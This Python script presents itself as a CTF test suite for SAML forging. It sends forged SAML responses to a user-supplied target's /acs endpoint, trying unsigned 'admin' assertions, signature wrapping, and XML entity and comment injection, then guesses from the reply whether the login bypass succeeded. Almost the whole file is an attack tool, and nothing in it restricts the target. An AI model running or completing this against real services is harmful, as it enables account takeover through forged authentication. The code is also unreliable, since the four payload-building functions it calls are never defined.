#!/usr/bin/env python3
"""
CTF SAML Attack Testing Suite
Tests various SAML forging techniques
"""

import requests
import base64
import urllib.parse
from xml.etree import ElementTree as ET

class SAMLTester:
    def __init__(self, target_url, acs_endpoint="/acs"):
        self.target_url = target_url
        self.acs_endpoint = acs_endpoint
        self.session = requests.Session()
    
    def test_unsigned_assertion(self, username="admin"):
        """Test if target accepts unsigned assertions"""
        print(f"[*] Testing unsigned assertion with username: {username}")
        
        # Create unsigned SAML response
        forged_response = create_unsigned_saml_response(username)
        encoded_response = base64.b64encode(forged_response.encode()).decode()
        
        # Send to ACS endpoint
        data = {'SAMLResponse': encoded_response}
        response = self.session.post(f"{self.target_url}{self.acs_endpoint}", data=data)
        
        return self.analyze_response(response, "unsigned assertion")
    
    def test_signature_wrapping(self, original_response, username="admin"):
        """Test signature wrapping attack"""
        print(f"[*] Testing signature wrapping with username: {username}")
        
        wrapped_response = create_wrapped_saml_response(original_response, username)
        encoded_response = base64.b64encode(wrapped_response.encode()).decode()
        
        data = {'SAMLResponse': encoded_response}
        response = self.session.post(f"{self.target_url}{self.acs_endpoint}", data=data)
        
        return self.analyze_response(response, "signature wrapping")
    
    def test_xml_injection(self):
        """Test XML entity/comment injection"""
        print("[*] Testing XML injection techniques")
        
        payloads = [
            create_entity_injection_payload(),
            create_comment_injection_payload()
        ]
        
        results = []
        for i, payload in enumerate(payloads):
            encoded_response = base64.b64encode(payload.encode()).decode()
            data = {'SAMLResponse': encoded_response}
            response = self.session.post(f"{self.target_url}{self.acs_endpoint}", data=data)
            results.append(self.analyze_response(response, f"XML injection #{i+1}"))
        
        return results
    
    def analyze_response(self, response, attack_type):
        """Analyze response for signs of successful authentication"""
        indicators = [
            "dashboard", "admin", "welcome", "logout", "profile",
            "authenticated", "success", "authorized"
        ]
        
        result = {
            'attack_type': attack_type,
            'status_code': response.status_code,
            'success_indicators': [],
            'response_length': len(response.text),
            'likely_success': False
        }
        
        response_text = response.text.lower()
        for indicator in indicators:
            if indicator in response_text:
                result['success_indicators'].append(indicator)
        
        # Heuristics for success
        if (response.status_code == 200 and 
            (len(result['success_indicators']) > 0 or 
             'set-cookie' in str(response.headers).lower())):
            result['likely_success'] = True
        
        return result

# Usage example for CTF
if __name__ == "__main__":
    target = input("Enter target URL: ")
    tester = SAMLTester(target)
    
    print("=== SAML Forging CTF Test Suite ===\n")
    
    # Test 1: Unsigned assertion
    result1 = tester.test_unsigned_assertion("admin")
    print(f"Unsigned assertion result: {result1}")
    
    # Test 2: XML injection
    results2 = tester.test_xml_injection()
    print(f"XML injection results: {results2}")
    
    print("\n=== Test Complete ===")
